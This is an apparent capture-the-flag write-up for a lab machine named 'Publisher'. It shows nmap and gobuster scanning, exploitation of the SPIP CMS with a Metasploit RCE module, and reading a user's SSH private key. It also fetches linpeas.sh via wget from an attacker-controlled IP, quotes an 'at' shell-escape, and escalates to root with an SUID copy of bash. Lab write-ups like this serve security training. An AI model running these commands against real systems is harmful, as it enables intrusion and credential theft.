# Publisher

----

## **`Nmap`** Scan

```
nmap -sCV -Pn 10.112.135.114
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-13 04:27 EDT
Nmap scan report for 10.112.135.114
Host is up (0.12s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 2b:1a:51:08:5e:3d:7f:b2:36:15:e5:1f:f0:03:39:92 (RSA)
|   256 91:91:5e:52:e5:a1:f7:25:fc:5c:1c:67:a4:4a:2c:30 (ECDSA)
|_  256 ad:28:b9:54:dd:ff:3a:5c:c7:b2:40:c8:81:7c:a0:b5 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Publisher's Pulse: SPIP Insights & Tips
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.74 seconds

```

## `Gobuster` 

```
gobuster dir -w /home/kali/Downloads/wordlists/directory-list-2.3-medium.txt -u http://publisher.thm/
```

<img width="1076" height="373" alt="image" src="https://github.com/user-attachments/assets/4c2db99d-0215-4397-9aaa-2ce4d87aa5ed" />

```
http://publisher.thm/spip/
```

<img width="1573" height="494" alt="image" src="https://github.com/user-attachments/assets/f2182a39-dfb4-4756-81df-34862b4f2eea" />

```
searchsploit spip 4.2
```

<img width="1054" height="162" alt="image" src="https://github.com/user-attachments/assets/4216f9ee-2a55-49e8-9638-56898f1696c5" />

## exploit it with metasploit

```
use exploit/multi/http/spip_rce_form
set rhosts MACHIN_IP
set TARGETURI /spip/
set lhost tun0
run
```

<img width="940" height="440" alt="image" src="https://github.com/user-attachments/assets/0d503826-9875-49d8-ba38-03f49a96eebb" />

## found user flag 

<img width="1105" height="205" alt="image" src="https://github.com/user-attachments/assets/7d47a170-e074-45d1-96e8-c68d68e12eea" />

```
fa22**********************6f4ca5
```

--- 

## privesc

```
cd .shh
cat id_rsa
```

<img width="1119" height="366" alt="image" src="https://github.com/user-attachments/assets/05287ebb-da64-4fb0-8608-ab5930a9f32e" />

```
nano id_rsa
chmod 600 id_rsa
```

```
ssh think@10.112.135.114 -i id_rsa
```

<img width="1090" height="262" alt="image" src="https://github.com/user-attachments/assets/3ea1be27-4765-4e46-8180-abc9d11d8d3a" />

Due to background protections, it was not possible to execute certain files. However, I was able to leverage SUID binaries to run them.

Among the available options, `at` can be exploited. GTFOBins suggests the following command:\
`echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null`.

```
wget http://192.168.137.69:8888/linpeas.sh -O p.sh
```

<img width="1118" height="471" alt="image" src="https://github.com/user-attachments/assets/b7ca333b-0357-4443-8998-3b026ffa4520" />

```
./p.sh
```

<img width="722" height="170" alt="image" src="https://github.com/user-attachments/assets/6cf3921b-9caf-45a2-89a1-b02248bd9081" />

```
cd /opt
ls -la
```

<img width="717" height="178" alt="image" src="https://github.com/user-attachments/assets/9bcd7ae7-9b49-473f-988a-05557163cafa" />

```
#!/bin/bash

cp /bin/bash /tmp/test
chmod +s /tmp/test
```

```
cd /tmp
./test -p

```

